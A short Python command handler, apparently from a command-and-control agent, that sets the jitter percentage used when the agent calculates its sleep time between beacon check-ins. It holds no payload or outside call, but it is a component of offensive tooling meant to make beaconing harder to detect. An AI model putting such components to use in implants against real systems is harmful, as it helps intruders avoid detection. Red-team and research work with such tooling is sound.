from commands import config

# Updates the shared jitter percentage read by get_sleep_time() in agent.py on each iteration
def execute(params, task_id, callback_id):
    config.jitter = float(params)
    return f"Jitter updated to {config.jitter}%"
